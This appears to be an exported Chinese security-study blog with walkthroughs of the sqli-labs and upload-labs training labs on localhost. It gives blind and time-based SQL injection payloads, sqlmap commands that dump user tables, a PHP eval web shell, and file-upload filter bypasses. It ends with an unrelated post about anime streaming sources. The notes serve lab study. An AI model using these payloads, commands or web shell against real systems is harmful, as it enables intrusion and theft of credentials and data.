<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;106--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;105--+   返回错误</span><br></pre></td></tr></table></figure>
<p>说明第一个字段名是i，以此类推，可以得到所有字段名，最终我们发现关键的字段名username,password</p>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;67--+  返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;68--+  返回错误</span><br></pre></td></tr></table></figure>
<p>说明第一个用户名是D，以此类推，可以得到所有用户名和密码。</p>
</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>手动进行布尔注入或时间注入很麻烦，我们只需要理解并记住其原理步骤即可</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/FourthGuy/article/details/108984045">sqli-labs-master第八关</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap使用</title>
    <url>/2022/11/21/sqlmap%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其实是有些犹豫，要不要写这一篇的，因为觉得自己学得很浅显。<br>想了想，还是写下来吧。毕竟这个工具我是从一张白纸开始，如果不写笔记，说不定很快会忘记。</p>
<span id="more"></span>
<h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>说明：本文以Windows10环境下的sqlmap版本为1.6.11.3为例，对sqlmap的一些基本使用进行讲解。本篇的示例以sqli-labs为主。<br>用法：python sqlmap.py [选项]</p>
<h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><ul>
<li>Windows方式<br><a href="https://sqlmap.org/">官网</a><br>下载zip文件<br>我的是在Windows物理机上安装的，在cmd里执行命令时，需要在开头多输入一个python才能执行。<br>注意cmd运行时，需要将cmd的位置换到该安装目录下才可以。</li>
<li>Linux方式<br>git直接安装<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gitclone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</span><br></pre></td></tr></table></figure></li>
<li>kali及PentestBox默认安装sqlmap</li>
</ul>
<h2 id="基本选项"><a href="#基本选项" class="headerlink" title="基本选项"></a>基本选项</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-h,--help  显示基本帮助信息并退出</span><br><span class="line">-hh    	显示高级帮助信息并退出</span><br><span class="line">--version  显示程序版本信息并退出</span><br><span class="line">-v			VERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。</span><br></pre></td></tr></table></figure>

<h2 id="爆破sqli-labs的第1-10关-GET型"><a href="#爆破sqli-labs的第1-10关-GET型" class="headerlink" title="爆破sqli-labs的第1-10关(GET型)"></a>爆破sqli-labs的第1-10关(GET型)</h2><p>首先来示例一下注入语句</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py --purge   清缓存，可做可不做</span><br><span class="line">在物理机上，一般需要首先输入python，--purge是清除的意思。注意需要两个杠--</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1   判断是否存在注入点</span><br><span class="line">-u的意思是url，即在后面添加所需的url  GET注入时不仅需要url，还需要添加注入点，比如这里的?id=1  </span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1  --dbs --batch   爆破所有数据库</span><br><span class="line">--dbs的意思是database，即爆库  --batch的意思是批处理，即在sqlmap运行时出现选项的时候自动选择默认选项。</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 -D security --tables --batch  爆破security数据库下所有的表</span><br><span class="line">-D意思是database，即在什么数据库下扫描   --tables即为爆数据表</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 -D security -T users --columns --batch   爆字段名</span><br><span class="line">-T意思是tables，后面跟所需扫描的表  --columns即为爆字段名</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot; -D database() -T users -C &quot;id,username,password&quot; --dump --batch   爆数据</span><br><span class="line">-C意思是columns，后面跟所需要扫描的字段名  --dump意思是转储，即显示数据</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li>在执行过程中根据数据大小和注入方式等的不同，会导致扫描时间不同，耐心等待即可。如果一个扫描超出预计等待时间，通常可能哪里弄错了，关了和重新打开尝试即可。</li>
<li>扫描得到的数据通常会以表的形式显示出来</li>
<li>常用英文说明<br>boolean-based blind: 布尔盲注<br>error-based: 报错注入<br>AND&#x2F;OR time-based blind: 时间盲注<br>UNION query: 联合注入</li>
</ul>
<h2 id="爆破sqli-labs的第11-17关-POST型"><a href="#爆破sqli-labs的第11-17关-POST型" class="headerlink" title="爆破sqli-labs的第11-17关(POST型)"></a>爆破sqli-labs的第11-17关(POST型)</h2><p>首先来示例一下注入语句</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; --dbs --batch   爆破所有数据库</span><br><span class="line">POST注入时在后面添加index.php, --data意思是通过POST发送参数，后面是具体需要发送的参数</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; -D security --tables --batch   爆破security数据库下所有的表</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; -D security -T users --columns --batch</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; -D security -T users -C id,username,password --dump --batch</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li>除了发送参数有区别，其它都没什么区别</li>
</ul>
<h2 id="爆破sqli-labs的第18关-User-Agent注入"><a href="#爆破sqli-labs的第18关-User-Agent注入" class="headerlink" title="爆破sqli-labs的第18关(User-Agent注入)"></a>爆破sqli-labs的第18关(User-Agent注入)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-18/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --user-agent=&quot;*&quot; --thread=10 --dbs --batch  爆破数据库</span><br><span class="line">这里不再需要在url后面添加index.php了   user-agent是用户代理，注入点在这里，因此选择这里注入  --thread=10 意思是线程数为10，表示运行快慢，太高容易被检测到，不宜高线程</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li>除了发送参数有区别，其它都没什么区别，依葫芦画瓢即可</li>
</ul>
<h2 id="爆破sqli-labs的第19关-Referer注入"><a href="#爆破sqli-labs的第19关-Referer注入" class="headerlink" title="爆破sqli-labs的第19关(Referer注入)"></a>爆破sqli-labs的第19关(Referer注入)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-18/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --referer=&quot;*&quot; --thread=10 --dbs --batch  爆破数据库</span><br><span class="line">参数改为referer罢了，思路相同</span><br></pre></td></tr></table></figure>

<h2 id="爆破sqli-labs的第20关-Cookie注入"><a href="#爆破sqli-labs的第20关-Cookie注入" class="headerlink" title="爆破sqli-labs的第20关(Cookie注入)"></a>爆破sqli-labs的第20关(Cookie注入)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-18/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --cookie=&quot;uname=admin&quot; --dbs --batch  爆破数据库</span><br><span class="line">参数改为cookie，差别不大</span><br></pre></td></tr></table></figure>

<h2 id="爆破sqli-labs的第21关-Cookie注入"><a href="#爆破sqli-labs的第21关-Cookie注入" class="headerlink" title="爆破sqli-labs的第21关(Cookie注入)"></a>爆破sqli-labs的第21关(Cookie注入)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-18/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --cookie=&quot;uname=*&quot; --dbs --tamper &quot;base64encode.py&quot; --batch  爆破数据库</span><br></pre></td></tr></table></figure>

<h2 id="爆破sqli-labs的第21关-Cookie注入-1"><a href="#爆破sqli-labs的第21关-Cookie注入-1" class="headerlink" title="爆破sqli-labs的第21关(Cookie注入)"></a>爆破sqli-labs的第21关(Cookie注入)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>第18关整半天弄不出来，也不知道什么原因，气死了。<br>所以这次就先写到17关了，以后有机会再补完。</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_9+10</title>
    <url>/2022/11/09/sqli-labs_9+10/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第九关既不能显示正确，也不会显示错误。因此不能使用布尔盲注，只能使用<a href="https://truthnian.github.io/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">时间盲注</a>。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 显示：You are in………..<br>输入?id&#x3D;1” 显示：You are in………..<br>此时我们应该发现端倪，页面可能不会返回任何信息<br>输入?id&#x3D;1 and sleep(5)--+  页面迅速显示<br>输入?id&#x3D;1’and sleep(5)--+  页面延迟了5s，说明的确是应当使用时间盲注<br>输入?id&#x3D;1’’and sleep(5)--+  页面迅速显示<br>说明是单引号字符型注入</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select database()))&gt;7,sleep(5),1)--+    页面迅速显示</span><br><span class="line">?id=1&#x27;and if(length((select database()))&gt;8,sleep(5),1)--+    页面延迟了5s</span><br></pre></td></tr></table></figure>
<p>说明数据库名长度是8个字符<br>版本号以此类推</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;115,sleep(5),1)--+   页面迅速显示</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;114,sleep(5),1)--+   页面延迟了5s</span><br></pre></td></tr></table></figure>
<p>最终尝试完后可得数据库名是security</p>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">如此判断所有表名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">再逐一判断表名</span><br></pre></td></tr></table></figure>
<p>最终尝试完后可得所需表名为users</p>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名</span><br></pre></td></tr></table></figure>
<p>最终出现了我们所需的字段名username, password</p>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容</span><br></pre></td></tr></table></figure>
<p>最终得到了所需的数据</p>
</li>
</ol>
<h2 id="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"><a href="#第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号" class="headerlink" title="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"></a>第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我终于知道为什么别人写博客，有些关会写得相当简略了，因为都是一样的，确实没意思…</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs以及蚁剑安装</title>
    <url>/2022/11/23/upload-labs+%E8%9A%81%E5%89%91install/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>安装这个两个东西，其实还是有点麻烦的，于我而言。所以我打算记录一下。</p>
<span id="more"></span>
<h1 id="蚁剑安装"><a href="#蚁剑安装" class="headerlink" title="蚁剑安装"></a><strong>蚁剑安装</strong></h1><p>首先我们要获取蚁剑–&gt;<a href="https://www.yuque.com/antswordproject/antsword/srruro">获取蚁剑</a><br>点击里面的链接“获取加速器”<br>先自己建立一个AntSword目录并在该目录里建立antsword_project目录，然后下载自己所需的版本，解压。<br>之后再点击解压后的AntSword.exe文件，记得用<strong>管理员方式</strong>打开，初始化，选择antsword_project空目录作为蚁剑的工作目录。<br>如果之前已经有了蚁剑源代码，可以在这一步选择工作目录的时候，直接选择该目录作为工作目录。</p>
<h1 id="upload-labs配置"><a href="#upload-labs配置" class="headerlink" title="upload-labs配置"></a>upload-labs配置</h1><p>官方地址：<a href="https://github.com/c0ny1/upload-labs">upload-labs</a><br>按照提示进行即可。<br>推荐的PHP5.2.117，PHP官方已经没有下载地址了，所以我们可以另找一个。<br><a href="https://www.cnblogs.com/endv/p/7743472.html">PHP5.2.17下载链接</a><br>选择其中的php-5.2.17-nts-Win32.zip下载即可。<br>解压后，把php.ini-recommended改成php.ini<br>然后把解压后的所有文件放在phpstudy的PHP目录下(默认安装了phpstudy)，这样就完成了。<br>如果Windows，点击下载地址链接，选择其中的Source code下载即可（有phpstudy的话）。<br>将其转移到phpstudy下的WWW目录，把upload-labs-masters目录名改为upload-labs。<br>并在其下建立一个upload，作为其存放上传文件的目录。<br>网站测试：<br>启动phpstudy，网页输入：127.0.0.1&#x2F;upload-labs<br>如果成功显示正常页面就基本没问题了。</p>
]]></content>
      <categories>
        <category>upload-labs</category>
        <category>蚁剑</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>upload-labs</tag>
        <tag>安装</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_1</title>
    <url>/2022/11/23/upload-labs_1/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>作为上传漏洞的第一关，啥都没了解就开始做还是遇到了一些障碍。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><ol>
<li><p>测试<br>看到任务，是上传一个webshell到服务器。<br>首先尝试上传，选择png文件，上传成功<br>然后选择txt文件，出现报错，显示只能上传jpg,png,gif的文件。<br>于是我们可以先把想要上传的文件改为允许类型，再抓包改文件后缀，实现shell的上传。</p>
</li>
<li><p>尝试与抓包<br>把写有 <code>&lt;?php phpinfo(); ?&gt;</code> 代码的txt文件改文件名为a.png。<br>提交后burp抓包，得到包的内容后，把包里的所有png改为php，之后放包，我们就可以看到文件上传成功了。<br>再打开网址测试 <code>127.0.0.1/upload-labs/upload/a.php</code><br>页面显示成功，那么说明我们的思路没问题。</p>
</li>
<li><p>上传webshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo(); @eval($_POST[&#x27;shell&#x27;]); ?&gt;   写入到b.txt</span><br><span class="line">将文件后缀改为png</span><br></pre></td></tr></table></figure>
<p>和上一个步骤一样，上传文件。<br>然后测试 <code>127.0.0.1/upload-labs/upload/b.php</code><br>显示成功。<br>我们可以打开蚁剑。点击鼠标右键-&gt;添加数据<br>“URL地址”填写测试的地址，连接密码自己任意设定。如果不放心，点右上角的“测试连接”，成功代表无问题，最后左上角“添加”。<br>创建成功后，右键点击我们创建的这条数据，再点“虚拟终端”，输入dir可看到目录中存在我们的php文件。</p>
</li>
</ol>
<h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><p>由于白名单函数是在JavaScript中运行，所以可以禁用或修改JavaScript来关闭白名单，这样就可以直接把目标文件上传到服务器。<br>比如在Firefox中打开about:config，然后搜索javascript.enabled  默认是true，即使用JavaScript。可以修改为false禁用。<br>或者按F12，修改白名单的源码保存。（不推荐，实际用处不大）</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>曲曲折折走了些弯路，幸好最后成功了，不过先看点教学视频也许会上手更快。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Xionghuimin/article/details/106506988#:~:text=%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E6%89%93%E5%BC%80%20%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91%20%EF%BC%8C%E5%A2%9E%E5%8A%A0%20%E6%95%B0%E6%8D%AE%20%EF%BC%8C%E7%84%B6%E5%90%8E%E5%A1%AB%E5%86%99URL%20%E5%9C%B0%E5%9D%80%20%EF%BC%8C%E5%A1%AB%E5%86%99%E8%87%AA%E5%B7%B1%E7%9A%84%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0,%E5%80%BC%20%E4%B8%BA%E7%A9%BA%20%EF%BC%8C%E4%B8%8D%E8%A6%81%E7%9D%80%E6%80%A5%EF%BC%8C%E5%8F%AA%E8%A6%81%E4%BD%A0%E5%A6%82%E4%B8%8B%E5%A1%AB%E5%86%99%E5%B0%B1%E8%A1%8C%E3%80%82%20%E5%89%8D%E9%9D%A2%E6%98%AF%E8%87%AA%E5%B7%B1%E7%9A%84IP%20%E5%9C%B0%E5%9D%80%20%EF%BC%8C%E5%90%8E%E9%9D%A2%E6%98%AF%E8%87%AA%E5%B7%B1%20%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%20%E7%9A%84%E4%BD%8D%E7%BD%AE%E3%80%82">文件上传漏洞—蚁剑连接地址错误、一句话木马php语法错误</a><br><a href="https://blog.csdn.net/hexiaan/article/details/127054253">upload-labs Pass-01</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_2</title>
    <url>/2022/11/24/upload-labs_2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关难度也不大，只是涉及到了新的知识点。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试<br>首先可以尝试传输文件。<br>当我传输一个txt文件时，提示类型错误，但这次和第一关不同，不是弹窗，而是页面直接提示，因此不是前端JavaScript验证。<br>这时我们查看源码，可以看到下面这一段：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>从这段代码可以看出，上传文件的途中验证了content-type，并且固定了上传文件类型。这里涉及到了MIME。<br>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。<br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。<br>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL，因此 We b服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。<br>语法：<br>type&#x2F;subtype<br>用法：<br>客户端：<br>告诉服务端上传文件类型<br>告诉服务端可以接受文件类型<br>服务端：<br>告诉客户端响应数据类型<br>详细参见：<a href="https://www.runoob.com/http/mime-types.html">MIME 类型</a><br>因此可以通过改变content-type来让目标文件上传成功</p>
</li>
<li><p>尝试与抓包<br>burp抓包，将content-type更改为image&#x2F;png，然后放包，我们就看到文件上传成功了。<br>然后打开，显示没问题，最终成功！</p>
</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>总的来说，没什么难度。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_62879498/article/details/123021865">文件上传漏洞——upload-labs 1-19</a><br><a href="https://blog.csdn.net/K_ShenH/article/details/122438998">upload-labs安装及攻略</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_3</title>
    <url>/2022/11/24/upload-labs_3/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>稍微改改就好，就像化了个妆人就认不出了。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>测试<br>首先上传一个php文件，发现失败，显示信息为“提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！”<br>我们可以通过这个错误提示信息看出是黑名单，于是查看源码验证<br>通过源码，可以发现直接进行后缀名过滤，同时删除点，检查大小写去除字符串和空格。<br>但我们注意后缀名过滤的这行代码：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br></pre></td></tr></table></figure>
可以发现并没有过滤完全，因此我们可以通过更改等价后缀名的方式绕过。<br>那么接下来就是查看有哪些等价后缀名：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语言   等价扩展名</span><br><span class="line">asp    asa, cer, cdx</span><br><span class="line">aspx   ashx, asmx, ascx</span><br><span class="line">php    php2, php3, php4, php5, phps, phtml</span><br><span class="line">jsp    jspx, jspf</span><br></pre></td></tr></table></figure>
我们只需要把后缀名改成这些即可。<br>注意，因为默认Apache只解析少数几种后缀格式，所以最好到相应的httpd.conf文件下添加以下语句：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .php5 .php3</span><br></pre></td></tr></table></figure>
意即能够解析<br>AddType 指令 作用：在给定的文件扩展名与特定的内容类型之间建立映射 语法：AddType MIME-type extension<br>[extension] …<br>AddType指令在给定的文件扩展名与特定的内容类型之间建立映射关系。MIME-type指明了包含extension扩展名的文件的媒体类型。<br>AddType 是与类型表相关的，描述的是扩展名与文件类型之间的关系。</li>
</ol>
<h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><ol start="2">
<li>尝试与抓包<br>将文件后缀改为黑名单以外的后缀格式，即可顺利上传。或者通过抓包改后缀名。蚁剑顺利连接</li>
</ol>
<h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><ol start="2">
<li>尝试与抓包<br>上传文件后缀名依旧是php，但通过burp抓包，然后修改filename，采用双写绕过。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php::$DA::$DATATA</span><br></pre></td></tr></table></figure>
这样就能够顺利上传，放到网页上，删除最后的::$data，网页正常打开。再在蚁剑上建立连接，非常顺利。</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>今天在这一关弄了好久，起因却是一个有点儿离谱的原因。网页能打开，蚁剑却连不上。最后才发现，变量名就是密码，我第一关阴差阳错地对了。但我不知道密码要设为变量名，这一关也是随便一个密码，却一直过不了。最终发现是蚁剑的密码和文件内的变量名不同，谨记。<br>下次尽量避开这种失误。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_62879498/article/details/123021865">文件上传漏洞——upload-labs 1-19</a><br><a href="https://blog.csdn.net/K_ShenH/article/details/122438998">upload-labs安装及攻略</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>如何寻觅动画</title>
    <url>/2022/11/04/%E5%8A%A8%E6%BC%AB%E8%B5%84%E6%BA%90/</url>
    <content><![CDATA[<p><img src="/images/%E9%98%BF%E5%BD%BB.gif" alt="托尔"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>喜欢动画的人必不可少的，就是寻找能看动画的优质资源，本篇我就来梳理一下如何寻找动画资源，以我看番两年的经历来说说。字幕主要是（简中&amp;繁中）</p>
<h1 id="动画资源"><a href="#动画资源" class="headerlink" title="动画资源"></a>动画资源</h1><h2 id="正版资源"><a href="#正版资源" class="headerlink" title="正版资源"></a>正版资源</h2><ol>
<li><strong>bilibili港澳台区</strong><br>优点：</li>
</ol>
<ul>
<li>资源比较多，不用到处找</li>
<li>有弹幕和评论区，有分享的地方</li>
<li>除了独家代理，其它都可以免费观看<br>缺点：</li>
<li>在1080p资源中画质算是比较差的，压缩比较大</li>
<li>字幕样式比较丑，略影响观看</li>
<li>老番资源较少</li>
</ul>
<p>使用方式：<br>手机端：需要港澳台版的app，并设置代理(特指安卓，iphone不清楚)<br>电脑端：需要将设备地区设置为台湾(特指Windows 10，其它不清楚)<br>如果能用大陆代理，老番资源还是比较多的，无删改的可以看看，由于经常搞活动，会员价很便宜。<br>(活动)会员价：8刀&#x2F;年<br><a href="https://www.bilibili.com/">bilibili港澳台</a></p>
<ol start="2">
<li><strong>巴哈姆特动画疯</strong><br>优点：</li>
</ol>
<ul>
<li>绝大部分资源可以免费看。但需要等待30s广告，画质最高只有720p</li>
<li>资源比较多，不用到处找</li>
<li>有弹幕，可以分享</li>
